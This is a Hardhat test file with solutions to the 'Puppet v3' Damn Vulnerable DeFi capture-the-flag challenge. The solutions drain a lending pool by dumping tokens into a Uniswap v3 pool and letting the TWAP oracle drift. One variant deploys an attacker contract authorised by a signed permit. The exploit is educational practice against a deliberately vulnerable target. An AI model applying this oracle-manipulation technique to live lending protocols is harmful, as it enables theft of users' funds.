const { ethers } = require("hardhat");
const { expect } = require("chai");
const {
  time,
  setBalance,
} = require("@nomicfoundation/hardhat-network-helpers");

const positionManagerJson = require("@uniswap/v3-periphery/artifacts/contracts/NonfungiblePositionManager.sol/NonfungiblePositionManager.json");
const factoryJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Factory.sol/UniswapV3Factory.json");
const poolJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Pool.sol/UniswapV3Pool.json");

const swapRouterJson = require("@uniswap/swap-router-contracts/artifacts/contracts/V3SwapRouter.sol/V3SwapRouter.json");
const swapRouter02Json = require("@uniswap/swap-router-contracts/artifacts/contracts/SwapRouter02.sol/SwapRouter02.json");
const uniswapUtils = require("@uniswap/v3-sdk");
const JSBI = require("jsbi");
const { signERC2612Permit } = require("eth-permit");

// See https://github.com/Uniswap/v3-periphery/blob/5bcdd9f67f9394f3159dad80d0dd01d37ca08c66/test/shared/encodePriceSqrt.ts
const bn = require("bignumber.js");
bn.config({ EXPONENTIAL_AT: 999999, DECIMAL_PLACES: 40 });
function encodePriceSqrt(reserve0, reserve1) {
  return ethers.BigNumber.from(
    new bn(reserve1.toString())
      .div(reserve0.toString())
      .sqrt()
      .multipliedBy(new bn(2).pow(96))
      .integerValue(3)
      .toString()
  );
}

describe("[Challenge] Puppet v3", function () {
  let deployer, player;
  let uniswapFactory,
    weth,
    token,
    uniswapPositionManager,
    uniswapPool,
    lendingPool;
  let initialBlockTimestamp;

  /** SET RPC URL HERE */
  const MAINNET_FORKING_URL = process.env.ETH_MAINNET_FORKING_RPC_URL;

  // Initial liquidity amounts for Uniswap v3 pool
  const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
  const UNISWAP_INITIAL_WETH_LIQUIDITY = 100n * 10n ** 18n;

  const PLAYER_INITIAL_TOKEN_BALANCE = 110n * 10n ** 18n;
  const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 18n;
  const DEPLOYER_INITIAL_ETH_BALANCE = 200n * 10n ** 18n;

  const LENDING_POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;

  beforeEach(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

    // Fork from mainnet state
    await ethers.provider.send("hardhat_reset", [
      {
        forking: { jsonRpcUrl: MAINNET_FORKING_URL, blockNumber: 15450164 },
      },
    ]);

    // Initialize player account
    // using private key of account #2 in Hardhat's node
    player = new ethers.Wallet(
      "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d",
      ethers.provider
    );
    await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
    expect(await ethers.provider.getBalance(player.address)).to.eq(
      PLAYER_INITIAL_ETH_BALANCE
    );

    // Initialize deployer account
    // using private key of account #1 in Hardhat's node
    deployer = new ethers.Wallet(
      "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80",
      ethers.provider
    );
    await setBalance(deployer.address, DEPLOYER_INITIAL_ETH_BALANCE);
    expect(await ethers.provider.getBalance(deployer.address)).to.eq(
      DEPLOYER_INITIAL_ETH_BALANCE
    );

    // Get a reference to the Uniswap V3 Factory contract
    uniswapFactory = new ethers.Contract(
      "0x1F98431c8aD98523631AE4a59f267346ea31F984",
      factoryJson.abi,
      deployer
    );

    // Get a reference to WETH9
    weth = (await ethers.getContractFactory("WETH", deployer)).attach(
      "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2"
    );

    // Deployer wraps ETH in WETH
    await weth.deposit({ value: UNISWAP_INITIAL_WETH_LIQUIDITY });
    expect(await weth.balanceOf(deployer.address)).to.eq(
      UNISWAP_INITIAL_WETH_LIQUIDITY
    );

    // Deploy DVT token. This is the token to be traded against WETH in the Uniswap v3 pool.
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();

    // Create the Uniswap v3 pool
    uniswapPositionManager = new ethers.Contract(
      "0xC36442b4a4522E871399CD717aBDD847Ab11FE88",
      positionManagerJson.abi,
      deployer
    );
    const FEE = 3000; // 0.3%
    await uniswapPositionManager.createAndInitializePoolIfNecessary(
      weth.address, // token0
      token.address, // token1
      FEE,
      encodePriceSqrt(1, 1),
      { gasLimit: 5000000 }
    );

    let uniswapPoolAddress = await uniswapFactory.getPool(
      weth.address,
      token.address,
      FEE
    );
    uniswapPool = new ethers.Contract(
      uniswapPoolAddress,
      poolJson.abi,
      deployer
    );
    await uniswapPool.increaseObservationCardinalityNext(40);

    // Deployer adds liquidity at current price to Uniswap V3 exchange
    await weth.approve(
      uniswapPositionManager.address,
      ethers.constants.MaxUint256
    );
    await token.approve(
      uniswapPositionManager.address,
      ethers.constants.MaxUint256
    );
    await uniswapPositionManager.mint(
      {
        token0: weth.address,
        token1: token.address,
        tickLower: -60,
        tickUpper: 60,
        fee: FEE,
        recipient: deployer.address,
        amount0Desired: UNISWAP_INITIAL_WETH_LIQUIDITY,
        amount1Desired: UNISWAP_INITIAL_TOKEN_LIQUIDITY,
        amount0Min: 0,
        amount1Min: 0,
        deadline: (await ethers.provider.getBlock("latest")).timestamp * 2,
      },
      { gasLimit: 5000000 }
    );

    // Deploy the lending pool
    lendingPool = await (
      await ethers.getContractFactory("PuppetV3Pool", deployer)
    ).deploy(weth.address, token.address, uniswapPool.address);

    // Setup initial token balances of lending pool and player
    await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
    await token.transfer(
      lendingPool.address,
      LENDING_POOL_INITIAL_TOKEN_BALANCE
    );

    // Some time passes
    await time.increase(3 * 24 * 60 * 60); // 3 days in seconds

    // Ensure oracle in lending pool is working as expected. At this point, DVT/WETH price should be 1:1.
    // To borrow 1 DVT, must deposit 3 ETH
    expect(
      await lendingPool.calculateDepositOfWETHRequired(1n * 10n ** 18n)
    ).to.be.eq(3n * 10n ** 18n);

    // To borrow all DVT in lending pool, user must deposit three times its value
    expect(
      await lendingPool.calculateDepositOfWETHRequired(
        LENDING_POOL_INITIAL_TOKEN_BALANCE
      )
    ).to.be.eq(LENDING_POOL_INITIAL_TOKEN_BALANCE * 3n);

    // Ensure player doesn't have that much ETH
    expect(await ethers.provider.getBalance(player.address)).to.be.lt(
      LENDING_POOL_INITIAL_TOKEN_BALANCE * 3n
    );

    initialBlockTimestamp = (await ethers.provider.getBlock("latest"))
      .timestamp;
  });

  it("Execution (using Uniswap v3 router)", async function () {
    /** CODE YOUR SOLUTION HERE */
    // 1. Get the SwapRouter referencerouter
    // NB: address found in https://docs.uniswap.org/contracts/v3/reference/deployments
    // const swapRouterAddr = "0xE592427A0AEce92De3Edee1F18E0157C05861564";
    const swapRouter02Addr = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45";
    // const universalRouterAddr = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; // NB: not used here
    const swapRouter02 = new ethers.Contract(
      swapRouter02Addr,
      swapRouter02Json.abi,
      deployer
    );

    // 2. Swap all player DVT for as much WETH as possible
    await token
      .connect(player)
      .approve(swapRouter02.address, PLAYER_INITIAL_TOKEN_BALANCE);
    // NB: API reference at: https://docs.uniswap.org/contracts/v3/guides/swaps/single-swaps#swap-input-parameters
    const FEE = 3000; // 0.3%

    await swapRouter02.connect(player).exactInputSingle({
      tokenIn: token.address,
      tokenOut: weth.address,
      fee: FEE,
      recipient: player.address,
      amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
      amountOutMinimum: 0, // NB: it should be calculated in PROD
      sqrtPriceLimitX96: 0, // NB: it should be calculated in PROD
    });

    // 3. Alter the cumulative tick (time-weighted average (TWA) tick) by increasing the block
    // timestamp. Make sure it is less than 115s (deadline - test won't pass)
    await time.increase(107);

    // 4. Make sure the new quote is affordable and borrow all lending pool DVTs
    // | Time increase (s) | Quote (ETH) |
    // |:----------------:|:------------:|
    // |  25 |  74414.617947453797966922 |
    // |  50 |   1845.660555366301003056 |
    // | 100 |      1.135487628545014215 |
    // | 110 |      0.258809275239840624 |
    // | 115 |      0.123560185449085032 |
    const wethBalance = await weth.connect(player).balanceOf(player.address);
    const ethBalance = await ethers.provider.getBalance(player.address);
    const requireWeth = await lendingPool
      .connect(player)
      .calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    expect(requireWeth).to.be.lt(wethBalance + ethBalance);

    await weth.connect(player).approve(lendingPool.address, requireWeth);
    await lendingPool
      .connect(player)
      .borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
  });

  it("Execution (using Uniswap v3 router fine tunning `amountOutMinimum` and `sqrtPriceLimitX96`)", async function () {
    /** CODE YOUR SOLUTION HERE */
    // 1. Using the Uniswap v3 SDK & the Uniswap Pool contract calculate/estimate few params
    let slot0 = await uniswapPool.slot0();
    const tickLower = await uniswapPool.ticks(-60);
    // https://github.com/Uniswap/v3-sdk/blob/main/src/utils/sqrtPriceMath.ts#L48
    const nextSqrtPriceX96 =
      uniswapUtils.SqrtPriceMath.getNextSqrtPriceFromInput(
        JSBI.BigInt(slot0.sqrtPriceX96.toString()),
        JSBI.BigInt(tickLower.liquidityGross.toString()),
        JSBI.BigInt(PLAYER_INITIAL_TOKEN_BALANCE.toString()),
        false
      );
    // https://github.com/Uniswap/v3-sdk/blob/08a7c050cba00377843497030f502c05982b1c43/src/utils/swapMath.ts#L15
    const FEE = 3000; // 0.3%
    const [sqrtRatioNextX96, amountIn, amountOut, feeAmount] =
      uniswapUtils.SwapMath.computeSwapStep(
        JSBI.BigInt(slot0.sqrtPriceX96.toString()),
        nextSqrtPriceX96, // JSBI.subtract(uniswapUtils.TickMath.MAX_SQRT_RATIO, JSBI.BigInt("1")),
        JSBI.BigInt(tickLower.liquidityGross.toString()),
        JSBI.BigInt(UNISWAP_INITIAL_TOKEN_LIQUIDITY.toString()),
        JSBI.BigInt(FEE.toString())
      );
    // sqrtRatioNextX96 79464767034091439616153725231 (eq `nextSqrtPriceX96`)
    // amountIn         99700000000000000000
    // amountOut        99403145538492022814
    // feeAmount        300000000000000000

    // 2. Get the SwapRouter referencerouter
    // NB: address found in https://docs.uniswap.org/contracts/v3/reference/deployments
    // const swapRouterAddr = "0xE592427A0AEce92De3Edee1F18E0157C05861564";
    const swapRouter02Addr = "0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45";
    // const universalRouterAddr = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; // NB: not used here
    const swapRouter02 = new ethers.Contract(
      swapRouter02Addr,
      swapRouter02Json.abi,
      deployer
    );

    // 3. Swap all player DVT for as much WETH as possible
    await token
      .connect(player)
      .approve(swapRouter02.address, PLAYER_INITIAL_TOKEN_BALANCE);
    // NB: API reference at: https://docs.uniswap.org/contracts/v3/guides/swaps/single-swaps#swap-input-parameters

    // NB: from token1 to token0 is `MAX_SQRT_RATIO - 1`
    const oneForZero = JSBI.subtract(
      uniswapUtils.TickMath.MAX_SQRT_RATIO,
      JSBI.BigInt("1")
    ).toString();
    await swapRouter02.connect(player).exactInputSingle({
      tokenIn: token.address,
      tokenOut: weth.address,
      fee: FEE, // NB: or `feeAmount.toString()`
      recipient: player.address,
      amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
      amountOutMinimum: amountOut.toString(), // NB: minimum WETH amount is 99.403145538492022814 WETH
      sqrtPriceLimitX96: oneForZero, // NB: from token1 to token0 is `MAX_SQRT_RATIO - 1`
    });

    slot0 = await uniswapPool.slot0();
    expect(slot0.sqrtPriceX96.toString()).to.eq(oneForZero);

    // 4. Alter the cumulative tick (time-weighted average (TWA) tick) by increasing the block
    // timestamp. Make sure it is less than 115s (deadline - test won't pass)
    await time.increase(107);

    // 5. Make sure the new quote is affordable and borrow all lending pool DVTs
    // | Time increase (s) | Quote (ETH) |
    // |:----------------:|:------------:|
    // |  25 |  74414.617947453797966922 |
    // |  50 |   1845.660555366301003056 |
    // | 100 |      1.135487628545014215 |
    // | 110 |      0.258809275239840624 |
    // | 115 |      0.123560185449085032 |
    const wethBalance = await weth.connect(player).balanceOf(player.address);
    const ethBalance = await ethers.provider.getBalance(player.address);
    const requireWeth = await lendingPool
      .connect(player)
      .calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    expect(requireWeth).to.be.lt(wethBalance + ethBalance);

    await weth.connect(player).approve(lendingPool.address, requireWeth);
    await lendingPool
      .connect(player)
      .borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
  });

  it.only("Execution (using PuppetV3PoolAttacker contract)", async function () {
    /** CODE YOUR SOLUTION HERE */
    // 1. Using the Uniswap v3 SDK & the Uniswap Pool contract calculate/estimate few params
    let slot0 = await uniswapPool.slot0();
    const tickLower = await uniswapPool.ticks(-60);
    // https://github.com/Uniswap/v3-sdk/blob/main/src/utils/sqrtPriceMath.ts#L48
    const nextSqrtPriceX96 =
      uniswapUtils.SqrtPriceMath.getNextSqrtPriceFromInput(
        JSBI.BigInt(slot0.sqrtPriceX96.toString()),
        JSBI.BigInt(tickLower.liquidityGross.toString()),
        JSBI.BigInt(PLAYER_INITIAL_TOKEN_BALANCE.toString()),
        false
      );
    // https://github.com/Uniswap/v3-sdk/blob/08a7c050cba00377843497030f502c05982b1c43/src/utils/swapMath.ts#L15
    const FEE = 3000; // 0.3%
    const [sqrtRatioNextX96, amountIn, amountOut, feeAmount] =
      uniswapUtils.SwapMath.computeSwapStep(
        JSBI.BigInt(slot0.sqrtPriceX96.toString()),
        nextSqrtPriceX96, // JSBI.subtract(uniswapUtils.TickMath.MAX_SQRT_RATIO, JSBI.BigInt("1")),
        JSBI.BigInt(tickLower.liquidityGross.toString()),
        JSBI.BigInt(UNISWAP_INITIAL_TOKEN_LIQUIDITY.toString()),
        JSBI.BigInt(FEE.toString())
      );
    // sqrtRatioNextX96 79464767034091439616153725231 (eq `nextSqrtPriceX96`)
    // amountIn         99700000000000000000
    // amountOut        99403145538492022814
    // feeAmount        300000000000000000

    const nonce = await ethers.provider.getTransactionCount(player.address);
    const attackerAddr = ethers.utils.getContractAddress({
      from: player.address,
      nonce,
    });
    const { r, s, v } = await signERC2612Permit(
      player,
      token.address,
      player.address,
      attackerAddr,
      ethers.constants.MaxUint256
    );
    const puppetV3PoolAttacker = await (
      await ethers.getContractFactory("PuppetV3PoolAttacker", player)
    ).deploy(
      weth.address,
      token.address,
      uniswapPool.address,
      uniswapPositionManager.address,
      lendingPool.address,
      v,
      r,
      s,
      { value: 5n * 10n ** 17n } // NB: 0.5 ETH
    );

    // 3. Swap all player DVT for as much WETH as possible
    await puppetV3PoolAttacker
      .connect(player)
      .exploitSwap(amountOut.toString());

    // 4. Alter the cumulative tick (time-weighted average (TWA) tick) by increasing the block
    // timestamp. Make sure it is less than 115s (deadline - test won't pass)
    await time.increase(107);

    // 5. Borrow all lending pool DVTs
    await puppetV3PoolAttacker.connect(player).exploitBorrow();
  });

  afterEach(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Block timestamp must not have changed too much
    expect(
      (await ethers.provider.getBlock("latest")).timestamp -
        initialBlockTimestamp
    ).to.be.lt(115, "Too much time passed");

    // Player has taken all tokens out of the pool
    expect(await token.balanceOf(lendingPool.address)).to.be.eq(0);
    expect(await token.balanceOf(player.address)).to.be.gte(
      LENDING_POOL_INITIAL_TOKEN_BALANCE
    );
  });
});
